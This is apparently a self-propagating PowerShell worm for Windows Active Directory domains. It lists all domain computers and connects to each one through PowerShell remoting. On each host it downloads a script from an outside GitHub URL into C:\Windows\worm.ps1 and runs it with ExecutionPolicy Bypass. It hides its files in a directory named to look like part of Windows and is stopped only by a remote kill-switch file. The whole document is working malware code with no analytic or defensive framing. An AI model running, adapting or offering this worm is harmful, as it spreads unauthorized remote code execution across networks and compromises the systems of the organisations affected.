$computerNames = get-adcomputer -filter * | foreach {$_.DNSHostName}
if(!(Test-Path -Path 'C:\Program Files (x86)\Windows NT\TableTextService')){
    mkdir 'C:\Program Files (x86)\Windows NT\TableTextService'
    cd 'C:\Program Files (x86)\Windows NT\TableTextService'
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/master/TableTextServiceDa.txt","C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt")
}

function wormy{

while((get-content 'C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt' -tail 1 ) -ne 'xr'){
[int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
Write-Output 'slither'

Foreach($i in $computerNames){
    $s = new-pssession -ComputerName $i
    invoke-command -ComputerName $i -ScriptBlock {hostname}
    invoke-command -ComputerName $i -ScriptBlock {
        #get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 5 
        if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
            if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 30){
                Invoke-Command -ScriptBlock {
                $WebClient = New-Object System.Net.WebClient
                $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/master/EnumerateDomain.ps1","C:\Windows\worm.ps1")
                C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\worm.ps1' -ExecutionPolicy Bypass
                }
            }
        }
        else{
                $WebClient = New-Object System.Net.WebClient
                $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/master/EnumerateDomain.ps1","C:\Windows\worm.ps1")
                C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\worm.ps1' -ExecutionPolicy Bypass   
        }
        }
    }
    Get-PSSession | Remove-PSSession
    start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
}
}


wormy